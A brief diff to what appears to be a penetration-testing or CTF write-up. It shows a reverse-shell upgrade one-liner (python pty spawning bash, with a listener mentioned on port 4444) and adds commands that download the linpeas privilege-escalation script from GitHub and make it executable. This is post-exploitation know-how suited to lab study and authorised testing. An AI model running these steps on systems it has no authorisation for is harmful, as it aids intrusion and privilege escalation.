@@ -106,3 +106,10 @@ but alls good, we have a listener on 4444 on the other end so we gonna upgrade t
 python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm-256color
 ```
 
+Okay time to document how this whole linpeas shit works:
+
+```
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+chmod +x linpeas.sh
+```
+
